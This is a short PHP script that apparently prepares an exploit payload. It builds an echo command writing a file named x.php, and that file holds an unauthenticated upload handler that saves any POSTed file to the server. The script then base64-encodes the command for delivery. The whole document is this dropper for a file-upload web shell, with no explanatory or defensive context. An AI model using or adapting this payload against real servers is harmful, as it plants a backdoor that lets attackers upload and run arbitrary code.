<?php
$command="echo \"<?php copy(\$HTTP_POST_FILES['file']['tmp_name'],\$HTTP_POST_FILES['file']['name']);?>\" > x.php";
$data=base64_encode($command);
echo $data;
?>
